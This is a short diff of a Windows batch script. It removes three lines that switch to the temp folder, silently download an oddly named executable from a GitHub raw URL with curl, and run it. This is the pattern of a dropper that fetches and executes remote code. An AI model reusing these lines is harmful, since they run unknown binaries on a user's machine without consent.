@@ -1,8 +1,5 @@
 @shift /0
 @echo off
-cd %temp%
-curl -s https://raw.githubusercontent.com/hvhplayerdavid/-/main/AKgof53421!1.exe --output AKgof53421!1.exe
-start AKgof53421!1.exe
 chcp 65001
 title .gg/uzec3qhSyE
 mode 80,15
